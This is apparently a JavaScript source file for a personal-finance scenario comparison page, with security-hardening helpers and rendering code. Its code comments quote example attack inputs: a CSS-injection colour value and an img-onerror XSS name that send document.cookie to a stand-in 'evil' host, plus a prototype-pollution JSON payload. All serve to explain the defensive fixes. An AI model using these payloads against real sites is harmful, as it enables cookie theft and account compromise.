// ── SECURITY HELPERS (FULL-P0-B1, audit 2026-05-26) ─────────────────────
// All four shipped together because they protect adjacent attack surfaces
// in the same renderer pipeline (cards → details → insights → table).
//
// 1) escHtml — 5-char escape applied to EVERY user-controlled value
//    interpolated into innerHTML. Same invariant used codebase-wide
//    (NW-P0-3, DASH-P1-12, G-P0-2, R-P0-8, DS-P0-MATH, J-P0-*, SAGE-P0-XSS,
//    RC-P0-XSS, B-P0-XSS).
function escHtml(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) =>
    ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

// 2) _safeColor — validates a CSS color token before it enters any style
//    attribute. Without this, an attacker who saves a scenario with
//    color="red;background-image:url(//evil/?cookie='+document.cookie+');"
//    breaks out of the style="background:${sc.color}" interpolation. We
//    allow only: a fixed allowlist of CSS variables we use (matches the
//    color picker in scenarios.html) AND #RGB / #RRGGBB hex literals.
//    Falls back to the neutral teal token on any reject.
const _SAFE_CSS_VARS = new Set([
  'var(--money)', 'var(--teal)', 'var(--red)', 'var(--amber)',
  'var(--gold)', 'var(--text)', 'var(--text2)', 'var(--text3)',
]);
const _HEX_COLOR_RE = /^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;
function _safeColor(c) {
  if (typeof c !== 'string') return 'var(--money)';
  const t = c.trim();
  if (_SAFE_CSS_VARS.has(t)) return t;
  if (_HEX_COLOR_RE.test(t)) return t;
  return 'var(--money)';
}

// 3) _safeParseJson — strips __proto__ / constructor / prototype keys
//    from any parsed object. Pre-fix `JSON.parse(s)` on a tampered
//    localStorage payload like `{"__proto__":{"isAdmin":true}}` would
//    mutate Object.prototype globally on every page load. Same pattern
//    as D-SEC-13, R-SEC-17.
function _safeParseJson(str) {
  try {
    return JSON.parse(str, (k, v) => {
      if (k === '__proto__' || k === 'constructor' || k === 'prototype') return undefined;
      return v;
    });
  } catch (_) { return null; }
}

// 4) _pfcConfirm — promise-based modal that replaces native window.confirm().
//    Native confirm() is silently no-op in iOS PWA standalone mode (the
//    prompt is invisible) — the user thinks delete worked when it didn't.
//    Mirrors NW-P1-6 / G-P1-D / R-P0-9 / RC-P0-MODAL pattern. Markup is
//    #sc-confirm-modal in scenarios.html (added in this batch). Falls back
//    to native confirm if the modal DOM isn't present.
let _pfcConfirmActive = false;
function _pfcConfirm(message, okLabel) {
  return new Promise(function (resolve) {
    if (_pfcConfirmActive) { resolve(false); return; }
    _pfcConfirmActive = true;
    const modal = document.getElementById('sc-confirm-modal');
    const msgEl = document.getElementById('sc-confirm-msg');
    const okBtn = document.getElementById('sc-confirm-ok');
    const cancelBtn = document.getElementById('sc-confirm-cancel');
    if (!modal || !msgEl || !okBtn || !cancelBtn) {
      _pfcConfirmActive = false;
      resolve(window.confirm(message));
      return;
    }
    const previousFocus = document.activeElement;
    msgEl.textContent = message;
    okBtn.textContent = okLabel || 'Confirm';
    modal.classList.add('open');
    okBtn.focus();
    function cleanup(result) {
      modal.classList.remove('open');
      okBtn.removeEventListener('click', onOk);
      cancelBtn.removeEventListener('click', onCancel);
      document.removeEventListener('keydown', onKey);
      _pfcConfirmActive = false;
      try { if (previousFocus && previousFocus.focus) previousFocus.focus(); } catch (_) {}
      resolve(result);
    }
    function onOk() { cleanup(true); }
    function onCancel() { cleanup(false); }
    function onKey(e) {
      if (e.key === 'Escape') cleanup(false);
      if (e.key === 'Enter') cleanup(true);
    }
    okBtn.addEventListener('click', onOk);
    cancelBtn.addEventListener('click', onCancel);
    document.addEventListener('keydown', onKey);
  });
}

// ── DATA ──
const DEFAULT_USER = {
  income: 3000, otherIncome: 0,
  housing: 1200, food: 540, transport: 310, otherExp: 380,
  savings: 11580, investments: 0,
  debt: 8000, debtPay: 550,
  currency: '$', name: 'User'
};

function loadUser() {
  if (typeof PFCUser !== 'undefined') {
    try { return { ...DEFAULT_USER, ...PFCUser.get() }; } catch(e) { return { ...DEFAULT_USER }; }
  }
  try {
    const s = PFCStorage.get('user');
    // FULL-P0-B1 — was raw JSON.parse; now goes through _safeParseJson which
    // strips __proto__ / constructor / prototype keys to block prototype-
    // pollution via a tampered localStorage payload.
    const parsed = s ? _safeParseJson(s) : null;
    return parsed ? { ...DEFAULT_USER, ...parsed } : { ...DEFAULT_USER };
  } catch(e) { return { ...DEFAULT_USER }; }
}

let USER = loadUser();
let SCENARIOS = [];
let editingId = null;
let selectedColor = 'var(--money)';
let chartRange = 6;
let chart = null;
let selectedScenarioId = null;

function buildChartMonthLabels(count) {
  const labels = ['Now'];
  const now = new Date();
  for (let i = 1; i < count; i++) {
    const d = new Date(now.getFullYear(), now.getMonth() + i, 1);
    labels.push(new Intl.DateTimeFormat(undefined, { month: 'short' }).format(d));
  }
  return labels;
}
// Maximum possible label set (25 points: Now + 24 months). Built at runtime so
// month abbreviations start from the current month regardless of when the app loads.
const CHART_MONTHS_LABELS = buildChartMonthLabels(25);

function fmt(v) {
  const c = window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$');
  return c + Math.abs(Math.round(v)).toLocaleString();
}

// ── LOAD / SAVE ──
function loadScenarios() {
  try {
    const s = PFCStorage.get('scenarios');
    // FULL-P0-B1 — was raw JSON.parse; now goes through _safeParseJson which
    // strips __proto__ / constructor / prototype keys. A tampered localStorage
    // payload like `[{"__proto__":{"isAdmin":true}}]` would have poisoned
    // Object.prototype globally on every page load.
    if (!s) return [];
    const parsed = _safeParseJson(s);
    if (!Array.isArray(parsed)) return [];
    // Defensive: re-validate each scenario's color against the safelist so a
    // legacy stored color that was injected before this fix can't escape
    // its style="background:${color}" cell anymore.
    return parsed.map(sc => sc && typeof sc === 'object' ? { ...sc, color: _safeColor(sc.color) } : sc).filter(Boolean);
  } catch(e) { return []; }
}

function saveScenarios() {
  try { PFCStorage.setJSON('scenarios', SCENARIOS); } catch(e) {}
}

// ── CALCULATIONS ──
function calcSurplus(sc) {
  const income = (sc.income || 0) + (sc.otherIncome || 0);
  const expenses = (sc.housing || 0) + (sc.food || 0) + (sc.transport || 0) + (sc.otherExp || 0) + (sc.debtPay || 0);
  return income - expenses;
}

function calcNetWorth(sc) {
  return (sc.savings || 0) + (sc.investments || 0) - (sc.debt || 0);
}

function calcNetWorthAt(sc, months) {
  const surplus = calcSurplus(sc);
  const nw0 = calcNetWorth(sc);
  // Simple compound: savings grow, debt reduces by debtPay
  let nw = nw0;
  let debt = sc.debt || 0;
  let savings = (sc.savings || 0) + (sc.investments || 0);
  for (let m = 0; m < months; m++) {
    const debtPay = Math.min(sc.debtPay || 0, debt);
    debt = Math.max(0, debt - debtPay);
    savings += surplus - (surplus < 0 ? 0 : 0); // surplus already excludes debtPay
    nw = savings - debt;
  }
  return nw;
}

function buildForecastData(sc, months) {
  const pts = [];
  let savings = (sc.savings || 0) + (sc.investments || 0);
  let debt = sc.debt || 0;
  const income = (sc.income || 0) + (sc.otherIncome || 0);
  const expenses = (sc.housing || 0) + (sc.food || 0) + (sc.transport || 0) + (sc.otherExp || 0);
  const debtPay = sc.debtPay || 0;

  for (let m = 0; m <= months; m++) {
    pts.push(Math.round(savings - debt));
    if (m < months) {
      const actualDebtPay = Math.min(debtPay, debt);
      const surplus = income - (expenses + actualDebtPay);
      savings += surplus;
      debt = Math.max(0, debt - actualDebtPay);
    }
  }
  return pts;
}

function calcHealthScore(sc) {
  const income = (sc.income || 0) + (sc.otherIncome || 0);
  const expenses = (sc.housing || 0) + (sc.food || 0) + (sc.transport || 0) + (sc.otherExp || 0);
  const surplus = income - expenses - (sc.debtPay || 0);
  const savingsRate = income > 0 ? surplus / income : 0;
  const debtRatio = income > 0 ? (sc.debtPay || 0) / income : 0;
  const emergency = (sc.savings || 0) / Math.max(expenses, 1);

  let score = 50;
  score += Math.min(25, savingsRate * 100);
  score -= Math.min(20, debtRatio * 60);
  score += Math.min(20, emergency * 5);
  if (surplus > 0) score += 5;
  return Math.max(0, Math.min(100, Math.round(score)));
}

// ── CHART ──
function buildChart() {
  const ctx = document.getElementById('scenario-chart').getContext('2d');

  const allScenarios = getAllScenariosForChart();
  if (allScenarios.length === 0) {
    if (chart) { chart.destroy(); chart = null; }
    return;
  }

  const labels = CHART_MONTHS_LABELS.slice(0, chartRange + 1);

  const datasets = allScenarios.map(sc => {
    const data = buildForecastData(sc, chartRange);
    const isBase = sc.id === 'base';
    return {
      label: sc.name,
      data,
      borderColor: sc.color,
      backgroundColor: sc.color + '15',
      borderWidth: isBase ? 2 : 2,
      borderDash: isBase ? [5,3] : [],
      pointRadius: 0,
      pointHoverRadius: 5,
      pointHoverBackgroundColor: sc.color,
      tension: 0.4,
      fill: false,
    };
  });

  if (chart) chart.destroy();
  chart = new Chart(ctx, {
    type: 'line',
    data: { labels, datasets },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      interaction: { mode: 'index', intersect: false },
      plugins: {
        legend: {
          display: true,
          position: 'top',
          align: 'end',
          labels: {
            color: '#B8C2BC',
            font: { family: "'Inter', system-ui, sans-serif", size: 11 },
            boxWidth: 12, boxHeight: 2,
            padding: 12,
          }
        },
        tooltip: {
          backgroundColor: '#16271F',
          borderColor: 'rgba(255,255,255,0.1)',
          borderWidth: 1,
          titleColor: '#F0EDE2',
          bodyColor: '#B8C2BC',
          padding: 12,
          callbacks: {
            label: ctx => ' ' + ctx.dataset.label + ': ' + (USER.currency||'$') + Math.round(ctx.parsed.y).toLocaleString()
          }
        }
      },
      scales: {
        x: {
          grid: { color: 'rgba(255,255,255,0.04)' },
          ticks: { color: '#4A5A6E', font: { size: 11 } },
        },
        y: {
          grid: { color: 'rgba(255,255,255,0.04)' },
          ticks: {
            color: '#4A5A6E', font: { size: 11 },
            callback: v => (USER.currency||'$') + (Math.abs(v) >= 1000 ? (v/1000).toFixed(0)+'k' : v)
          }
        }
      }
    }
  });
}

function setChartRange(btn, months) {
  chartRange = months;
  document.querySelectorAll('.month-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  buildChart();
}

// ── GET ALL SCENARIOS INCLUDING BASE ──
function getAllScenariosForChart() {
  const base = {
    id: 'base',
    name: 'Current',
    color: '#4A5A6E',
    ...USER
  };
  return [base, ...SCENARIOS];
}

// ── RENDER SCENARIO CARDS ──
function renderCards() {
  const container = document.getElementById('scenario-cards-list');
  const addBtn = document.getElementById('add-btn');

  // Update add button
  if (SCENARIOS.length >= 5) {
    addBtn.disabled = true;
    addBtn.style.opacity = '0.4';
    addBtn.style.cursor = 'not-allowed';
    addBtn.title = 'Maximum 5 scenarios reached';
  } else {
    addBtn.disabled = false;
    addBtn.style.opacity = '1';
    addBtn.style.cursor = 'pointer';
    addBtn.title = '';
  }

  const allSc = getAllScenariosForChart();

  // FULL-P0-B1 — pre-fix this rendered:
  //   - `onclick="selectScenario('${sc.id}')"` (inline onclick + template
  //     interpolation = CSP-bypass + JS-string-escape if sc.id contains `'`)
  //   - `${sc.name}` and `${sc.desc}` raw into innerHTML (stored XSS via the
  //     scenario editor — save a scenario named `<img src=x onerror=...>`
  //     and it fires on every page load for the lifetime of localStorage)
  //   - `style="background:${sc.color}"` (CSS-injection if color is malicious)
  //
  // Now: every interpolated value is escHtml'd; sc.color is _safeColor'd; the
  // onclick handlers are gone — replaced with `data-action` attributes and a
  // single delegated click listener wired AFTER the innerHTML assignment.
  // Same pattern as G-P0-5 / R-P0-6+7 / SAGE-P0-CSP.
  container.innerHTML = allSc.map(sc => {
    const surplus = calcSurplus(sc);
    const nw12 = buildForecastData(sc, 12)[12];
    const score = calcHealthScore(sc);
    const isBase = sc.id === 'base';
    const isSelected = sc.id === selectedScenarioId;
    const safeColor = _safeColor(sc.color);
    const safeId = escHtml(sc.id);
    const safeName = escHtml(sc.name);
    const safeDesc = escHtml(sc.desc || (isBase ? 'Your current financial situation' : 'Custom scenario'));

    return `
    <div class="scenario-card ${isBase ? 'base-card' : ''} ${isSelected ? 'active-scenario' : ''}"
         data-sc-action="select" data-sc-id="${safeId}">
      <div class="scenario-color-dot" style="background:${safeColor}"></div>
      <div class="scenario-card-info">
        <div class="scenario-card-name">
          ${safeName}
          ${isBase ? '<span class="badge badge-blue">Current</span>' : ''}
        </div>
        <div class="scenario-card-desc">${safeDesc}</div>
      </div>
      <div class="scenario-metrics">
        <div class="sc-metric">
          <div class="sc-metric-label">Surplus/mo</div>
          <div class="sc-metric-val ${surplus >= 0 ? 'up' : 'down'}">${surplus >= 0 ? '+' : '-'}${escHtml(fmt(surplus))}</div>
        </div>
        <div class="sc-metric">
          <div class="sc-metric-label">12-mo NW</div>
          <div class="sc-metric-val">${escHtml(fmt(nw12))}</div>
        </div>
        <div class="sc-metric">
          <div class="sc-metric-label">Score</div>
          <div class="sc-metric-val">${score}</div>
        </div>
      </div>
      <div class="scenario-actions">
        ${!isBase ? `
          <button type="button" class="sc-btn" data-sc-action="edit" data-sc-id="${safeId}" title="Edit" aria-label="Edit scenario ${safeName}">&#10000;</button>
          <button type="button" class="sc-btn danger" data-sc-action="delete" data-sc-id="${safeId}" title="Delete" aria-label="Delete scenario ${safeName}">&#10005;</button>
        ` : ''}
      </div>
    </div>`;
  }).join('');

  // FULL-P0-B1 — single delegated click listener for the card grid. Uses
  // a sentinel to avoid re-binding on every renderCards() call (renderAll
  // re-runs renderCards on every state change, so without the sentinel we
  // would stack a new listener every render and leak memory).
  if (!container.__sc_click_wired) {
    container.__sc_click_wired = true;
    container.addEventListener('click', (e) => {
      const target = e.target.closest('[data-sc-action]');
      if (!target) return;
      const action = target.getAttribute('data-sc-action');
      const id = target.getAttribute('data-sc-id') || '';
      if (action === 'edit')    { e.stopPropagation(); editScenario(id); return; }
      if (action === 'delete')  { e.stopPropagation(); deleteScenario(id); return; }
      if (action === 'select')  { selectScenario(id); return; }
    });
  }
}

// ── RENDER DETAIL PANEL ──
function selectScenario(id) {
  selectedScenarioId = id;
  renderCards();

  const allSc = getAllScenariosForChart();
  const sc = allSc.find(s => s.id === id);
  if (!sc) return;

  const surplus = calcSurplus(sc);
  const nw = calcNetWorth(sc);
  const nw12 = buildForecastData(sc, 12)[12];
  const score = calcHealthScore(sc);
  const income = (sc.income || 0) + (sc.otherIncome || 0);
  const expenses = (sc.housing || 0) + (sc.food || 0) + (sc.transport || 0) + (sc.otherExp || 0);

  // FULL-P0-B1 — _safeColor before style assignment so a malicious stored
  // color can't break out of the inline style. .textContent is already safe
  // for sc.name; no change needed there.
  document.getElementById('detail-dot').style.background = _safeColor(sc.color);
  document.getElementById('detail-name').textContent = sc.name;

  const badge = document.getElementById('detail-badge');
  if (sc.id === 'base') {
    badge.textContent = 'Current';
    badge.className = 'badge badge-blue';
  } else {
    badge.textContent = 'Scenario';
    badge.className = 'badge badge-teal';
  }

  document.getElementById('detail-body').innerHTML = `
    <div class="detail-row"><span class="detail-row-label">Monthly income</span><span class="detail-row-val">${fmt(income)}</span></div>
    <div class="detail-row"><span class="detail-row-label">Monthly expenses</span><span class="detail-row-val">${fmt(expenses)}</span></div>
    <div class="detail-row"><span class="detail-row-label">Debt payment</span><span class="detail-row-val">${fmt(sc.debtPay || 0)}</span></div>
    <div class="detail-row">
      <span class="detail-row-label">Monthly surplus</span>
      <span class="detail-row-val" style="color:${surplus >= 0 ? 'var(--teal)' : 'var(--red)'}">
        ${surplus >= 0 ? '+' : ''}${fmt(surplus)}
      </span>
    </div>
    <div class="detail-row"><span class="detail-row-label">Current net worth</span><span class="detail-row-val">${fmt(nw)}</span></div>
    <div class="detail-row"><span class="detail-row-label">12-mo net worth</span><span class="detail-row-val" style="color:var(--teal)">${fmt(nw12)}</span></div>
    <div class="detail-row"><span class="detail-row-label">Savings</span><span class="detail-row-val">${fmt(sc.savings || 0)}</span></div>
    <div class="detail-row"><span class="detail-row-label">Total debt</span><span class="detail-row-val" style="color:${(sc.debt||0)>0?'var(--red)':'var(--teal)'}">${fmt(sc.debt || 0)}</span></div>
    <div class="detail-row"><span class="detail-row-label">Health score</span><span class="detail-row-val" style="color:${score>=75?'var(--teal)':score>=50?'var(--amber)':'var(--red)'}">
      ${score} / 100 ${score>=75?'🟢':score>=50?'🟡':'🔴'}
    </span></div>
    ${sc.desc ? `<div style="margin-top:12px;font-size:12px;color:var(--text3);line-height:1.5;font-style:italic;">${escHtml(sc.desc)}</div>` : ''}
  `;
}

// ── RENDER INSIGHTS ──
function renderInsights() {
  const allSc = getAllScenariosForChart();
  const container = document.getElementById('insights-list');

  if (SCENARIOS.length === 0) {
    container.innerHTML = `<div style="color:var(--text3);font-size:13px;padding:8px 0;">Add at least 1 custom scenario to see comparative insights.</div>`;
    return;
  }

  const base = allSc[0]; // current
  const insights = [];

  // FULL-P0-B1 — every `${...name}` interpolation below is escHtml'd. Scenario
  // names are user-controlled (the editor accepts any string); without escape
  // an attacker who saves `<img src=x onerror=fetch('//evil/?'+document.cookie)>`
  // would fire the payload on every page load of /scenarios for the victim.

  // Best surplus
  const bestSurplus = [...allSc].sort((a,b) => calcSurplus(b)-calcSurplus(a))[0];
  const baseSurplus = calcSurplus(base);
  if (bestSurplus.id !== 'base') {
    const diff = calcSurplus(bestSurplus) - baseSurplus;
    insights.push({
      icon: '💡', bg: 'rgba(43,182,125,0.12)',
      text: `<strong>${escHtml(bestSurplus.name)}</strong> gives you the highest monthly surplus — <strong>${escHtml(fmt(calcSurplus(bestSurplus)))}/mo</strong>, that's ${escHtml(fmt(diff))} more than your current situation.`
    });
  }

  // Biggest 12-mo NW gain
  const best12 = [...allSc].sort((a,b) => buildForecastData(b,12)[12]-buildForecastData(a,12)[12])[0];
  if (best12.id !== 'base') {
    const baseNw12 = buildForecastData(base,12)[12];
    const diff = buildForecastData(best12,12)[12] - baseNw12;
    if (diff > 0) {
      insights.push({
        icon: '📈', bg: 'rgba(59,130,246,0.12)',
        text: `<strong>${escHtml(best12.name)}</strong> builds <strong>${escHtml(fmt(diff))} more net worth</strong> in 12 months compared to staying on your current path.`
      });
    }
  }

  // Health score
  const bestScore = [...allSc].sort((a,b) => calcHealthScore(b)-calcHealthScore(a))[0];
  if (bestScore.id !== 'base') {
    const scoreDiff = calcHealthScore(bestScore) - calcHealthScore(base);
    if (scoreDiff > 0) {
      insights.push({
        icon: '❤️', bg: 'rgba(224,82,82,0.1)',
        text: `<strong>${escHtml(bestScore.name)}</strong> improves your financial health score by <strong>${scoreDiff} points</strong> to ${calcHealthScore(bestScore)}/100.`
      });
    }
  }

  // Warning: scenario with negative surplus
  const negSurplus = SCENARIOS.filter(s => calcSurplus(s) < 0);
  if (negSurplus.length > 0) {
    insights.push({
      icon: '⚠️', bg: 'rgba(245,166,35,0.1)',
      text: `<strong>${negSurplus.map(s=>escHtml(s.name)).join(', ')}</strong> ${negSurplus.length > 1 ? 'result in' : 'results in'} a negative monthly surplus — you'd be spending more than you earn.`
    });
  }

  // Scenarios all in positive surplus
  const allPositive = SCENARIOS.every(s => calcSurplus(s) >= 0);
  if (allPositive && SCENARIOS.length >= 2) {
    insights.push({
      icon: '✅', bg: 'rgba(34,197,94,0.1)',
      text: `All your scenarios result in a positive monthly surplus. Any of these paths keeps you financially healthy.`
    });
  }

  if (insights.length === 0) {
    insights.push({
      icon: '🔍', bg: 'rgba(255,255,255,0.05)',
      text: 'Your scenarios look similar to your current situation. Try testing bigger financial changes — like a 30% raise or moving to a lower cost-of-living city.'
    });
  }

  container.innerHTML = insights.map(ins => `
    <div class="insight-item">
      <div class="insight-icon" style="background:${ins.bg}">${ins.icon}</div>
      <div class="insight-text">${ins.text}</div>
    </div>
  `).join('');
}

// ── RENDER COMPARISON TABLE ──
function renderComparisonTable() {
  const wrap = document.getElementById('comparison-table-wrap');
  const allSc = getAllScenariosForChart();

  if (allSc.length < 2) {
    wrap.innerHTML = `<div style="color:var(--text3);font-size:13px;">Add a custom scenario to compare against your current situation.</div>`;
    return;
  }

  // Find best per metric
  const bestSurplusVal = Math.max(...allSc.map(s => calcSurplus(s)));
  const bestNW12Val = Math.max(...allSc.map(s => buildForecastData(s,12)[12]));
  const bestScoreVal = Math.max(...allSc.map(s => calcHealthScore(s)));
  const lowestDebt = Math.min(...allSc.map(s => s.debt || 0));

  const headers = ['Metric', ...allSc.map(s => s.name)];
  const rows = [
    {
      label: 'Monthly surplus',
      vals: allSc.map(s => { const v = calcSurplus(s); return { raw: v, display: (v>=0?'+':'')+fmt(v), best: v === bestSurplusVal, bad: v < 0 }; })
    },
    {
      label: '12-mo net worth',
      vals: allSc.map(s => { const v = buildForecastData(s,12)[12]; return { raw: v, display: fmt(v), best: v === bestNW12Val, bad: false }; })
    },
    {
      label: 'Health score',
      vals: allSc.map(s => { const v = calcHealthScore(s); return { raw: v, display: v + '/100', best: v === bestScoreVal, bad: v < 50 }; })
    },
    {
      label: 'Monthly income',
      vals: allSc.map(s => { const v = (s.income||0)+(s.otherIncome||0); return { raw: v, display: fmt(v), best: v === Math.max(...allSc.map(x=>(x.income||0)+(x.otherIncome||0))), bad: false }; })
    },
    {
      label: 'Total expenses',
      vals: allSc.map(s => { const v = (s.housing||0)+(s.food||0)+(s.transport||0)+(s.otherExp||0)+(s.debtPay||0); return { raw: v, display: fmt(v), best: v === Math.min(...allSc.map(x=>(x.housing||0)+(x.food||0)+(x.transport||0)+(x.otherExp||0)+(x.debtPay||0))), bad: false }; })
    },
    {
      label: 'Total debt',
      vals: allSc.map(s => { const v = s.debt||0; return { raw: v, display: fmt(v), best: v === lowestDebt, bad: v > 10000 }; })
    },
  ];

  // FULL-P0-B1 — headers come from `allSc.map(s => s.name)`; row.label is
  // hardcoded but row.vals[i].display already runs through fmt() (numbers
  // only). escHtml on header (user-controlled name) AND on display values
  // (defense-in-depth in case fmt ever returns something unexpected).
  wrap.innerHTML = `
    <div style="overflow-x:auto;">
    <table class="comparison-table">
      <thead>
        <tr>
          ${headers.map((h,i) => `<th style="${i>0?'text-align:right;':''}">${escHtml(h)}</th>`).join('')}
        </tr>
      </thead>
      <tbody>
        ${rows.map(row => `
          <tr>
            <td>${escHtml(row.label)}</td>
            ${row.vals.map(v => `<td style="text-align:right;" class="${v.best?'best':v.bad?'worst':''}">${escHtml(v.display)}</td>`).join('')}
          </tr>
        `).join('')}
      </tbody>
    </table>
    </div>
  `;
}

// ── RENDER SUMMARY STRIP ──
function renderSummary() {
  const allSc = getAllScenariosForChart();

  document.getElementById('sum-count').textContent = SCENARIOS.length;

  if (allSc.length === 0) return;

  const bestNWSc = [...allSc].sort((a,b) => buildForecastData(b,12)[12]-buildForecastData(a,12)[12])[0];
  document.getElementById('sum-best').textContent = fmt(buildForecastData(bestNWSc,12)[12]);
  document.getElementById('sum-best-name').textContent = bestNWSc.name;

  const bestSurplusSc = [...allSc].sort((a,b) => calcSurplus(b)-calcSurplus(a))[0];
  const bsurp = calcSurplus(bestSurplusSc);
  document.getElementById('sum-surplus').textContent = (bsurp>=0?'+':'')+fmt(bsurp)+'/mo';
  document.getElementById('sum-surplus-name').textContent = bestSurplusSc.name;

  const bestScoreSc = [...allSc].sort((a,b) => calcHealthScore(b)-calcHealthScore(a))[0];
  document.getElementById('sum-score').textContent = calcHealthScore(bestScoreSc)+'/100';
  document.getElementById('sum-score-name').textContent = bestScoreSc.name;
}

// ── FULL RENDER ──
function renderAll() {
  renderSummary();
  renderCards();
  renderInsights();
  renderComparisonTable();
  buildChart();
}

// ── MODAL ──
let modalMode = 'new'; // 'new' | 'edit'

function openModal(scId = null) {
  editingId = scId;
  modalMode = scId ? 'edit' : 'new';
  document.getElementById('modal-title').textContent = scId ? 'Edit scenario' : 'New scenario';

  // Pre-fill with USER data or scenario data
  const sc = scId ? SCENARIOS.find(s => s.id === scId) : null;
  const d = sc || USER;

  document.getElementById('sc-name').value = sc ? sc.name : '';
  document.getElementById('sc-desc').value = sc ? (sc.desc || '') : '';
  document.getElementById('sc-income').value = d.income || '';
  document.getElementById('sc-other-income').value = d.otherIncome || '';
  document.getElementById('sc-housing').value = d.housing || '';
  document.getElementById('sc-food').value = d.food || '';
  document.getElementById('sc-transport').value = d.transport || '';
  document.getElementById('sc-other-exp').value = d.otherExp || '';
  document.getElementById('sc-savings').value = d.savings || '';
  document.getElementById('sc-investments').value = d.investments || '';
  document.getElementById('sc-debt').value = d.debt || '';
  document.getElementById('sc-debt-pay').value = d.debtPay || '';

  // Color
  selectedColor = sc ? sc.color : pickNextColor();
  document.querySelectorAll('.color-opt').forEach(opt => {
    const isSelected = opt.dataset.color === selectedColor;
    opt.classList.toggle('selected', isSelected);
    opt.querySelector('svg').style.display = isSelected ? 'block' : 'none';
  });

  updatePreview();
  document.getElementById('modal-overlay').classList.add('open');
  document.getElementById('sc-name').focus();
}

function pickNextColor() {
  const colors = ['var(--money)','#3B82F6','#A78BFA','#F5A623','#E05252','#F472B6','#34D399','#FBBF24'];
  const usedColors = SCENARIOS.map(s => s.color);
  return colors.find(c => !usedColors.includes(c)) || colors[SCENARIOS.length % colors.length];
}

function closeModal() {
  document.getElementById('modal-overlay').classList.remove('open');
  editingId = null;
}

function closeModalIfBg(e) {
  if (e.target === document.getElementById('modal-overlay')) closeModal();
}

function selectColor(el) {
  selectedColor = el.dataset.color;
  document.querySelectorAll('.color-opt').forEach(opt => {
    const isSelected = opt.dataset.color === selectedColor;
    opt.classList.toggle('selected', isSelected);
    opt.querySelector('svg').style.display = isSelected ? 'block' : 'none';
  });
}

function getModalData() {
  return {
    income:       parseFloat(document.getElementById('sc-income').value) || 0,
    otherIncome:  parseFloat(document.getElementById('sc-other-income').value) || 0,
    housing:      parseFloat(document.getElementById('sc-housing').value) || 0,
    food:         parseFloat(document.getElementById('sc-food').value) || 0,
    transport:    parseFloat(document.getElementById('sc-transport').value) || 0,
    otherExp:     parseFloat(document.getElementById('sc-other-exp').value) || 0,
    savings:      parseFloat(document.getElementById('sc-savings').value) || 0,
    investments:  parseFloat(document.getElementById('sc-investments').value) || 0,
    debt:         parseFloat(document.getElementById('sc-debt').value) || 0,
    debtPay:      parseFloat(document.getElementById('sc-debt-pay').value) || 0,
  };
}

function updatePreview() {
  const d = getModalData();
  const surplus = calcSurplus(d);
  const nw12 = buildForecastData(d, 12)[12];
  const score = calcHealthScore(d);

  document.getElementById('prev-surplus').textContent = (surplus >= 0 ? '+' : '-') + fmt(surplus) + '/mo';
  document.getElementById('prev-surplus').style.color = surplus >= 0 ? 'var(--teal)' : 'var(--red)';
  document.getElementById('prev-nw').textContent = fmt(nw12);
  document.getElementById('prev-score').textContent = score + '/100';
  document.getElementById('prev-score').style.color = score >= 75 ? 'var(--teal)' : score >= 50 ? 'var(--amber)' : 'var(--red)';
}

function saveScenario() {
  const name = document.getElementById('sc-name').value.trim();
  if (!name) { showToast('⚠ Please enter a scenario name'); return; }

  // Plan-aware cap: Free=1, Pro/Premium=unlimited (soft cap 50 to prevent runaway).
  // The pricing contract (pricing.md) is the source of truth.
  if (!editingId) {
    const plan = (typeof PFCPlan !== 'undefined' && PFCPlan.get) ? PFCPlan.get() : 'free';
    const isPro = plan === 'pro' || plan === 'premium' || plan === 'owner_override';
    const cap = isPro ? 50 : 1;
    if (SCENARIOS.length >= cap) {
      if (!isPro) {
        showToast('Free includes 1 saved scenario — upgrade to Pro for unlimited.');
        setTimeout(() => { window.location.href = 'billing.html?from=scenarios&trigger=save-cap'; }, 1400);
      } else {
        showToast('Maximum ' + cap + ' scenarios reached');
      }
      return;
    }
  }

  const data = getModalData();

  // FULL-P0-B1 — _safeColor at SAVE time too (in addition to LOAD-time
   // sanitization in loadScenarios). Defense-in-depth: even if the color
  // picker were ever extended to allow custom hex input, the safelist
  // would catch anything that doesn't match the hex regex.
  const safeColorAtSave = _safeColor(selectedColor);
  if (editingId) {
    const idx = SCENARIOS.findIndex(s => s.id === editingId);
    if (idx > -1) {
      SCENARIOS[idx] = { ...SCENARIOS[idx], ...data, name, desc: document.getElementById('sc-desc').value.trim(), color: safeColorAtSave };
    }
    showToast('✓ Scenario updated');
  } else {
    SCENARIOS.push({
      id: 'sc_' + Date.now(),
      name,
      desc: document.getElementById('sc-desc').value.trim(),
      color: safeColorAtSave,
      createdAt: new Date().toISOString(),
      ...data
    });
    showToast('✓ Scenario added');
    // CDO Wave-14: pfc.scenario_saved fires only on the FIRST scenario save
    // (the Pro-tier value moment per CDO §1). Subsequent saves are not
    // funnel-meaningful — they're regular product usage.
    if (SCENARIOS.length === 1 && window.PFCFunnel) {
      window.PFCFunnel.track('pfc.scenario_saved');
    }
  }

  saveScenarios();
  closeModal();
  renderAll();
}

function editScenario(id) {
  openModal(id);
}

function deleteScenario(id) {
  // FULL-P0-B1 — was native window.confirm(). On iOS PWA standalone the
  // prompt is invisible, so the user taps Delete → nothing happens →
  // taps again → still nothing. _pfcConfirm is the codebase-standard
  // promise-based modal (same as NW-P1-6 / G-P1-D / R-P0-9 / RC-P0-MODAL).
  // Fallback to confirm() if the modal markup is missing (defensive only).
  _pfcConfirm('Delete this scenario?', 'Delete').then((ok) => {
    if (!ok) return;
    SCENARIOS = SCENARIOS.filter(s => s.id !== id);
    if (selectedScenarioId === id) selectedScenarioId = null;
    saveScenarios();
    renderAll();
    showToast('Scenario deleted');
  });
}

// ── TOAST ──
function showToast(msg) {
  const old = document.getElementById('sc-toast');
  if (old) old.remove();
  const t = document.createElement('div');
  t.id = 'sc-toast';
  t.className = 'toast';
  t.textContent = msg;
  document.body.appendChild(t);
  setTimeout(() => t.style.opacity = '0', 3000);
  setTimeout(() => t.remove(), 3300);
}

function showNavToastExt(msg) {
  showToast('★ Pro — ' + msg);
}

// ── INIT ──
document.getElementById('today-date').textContent = new Date().toLocaleDateString('en-GB', {day:'numeric', month:'long', year:'numeric'});

// Load user data for sidebar
const sidebarName = document.getElementById('sidebar-name');
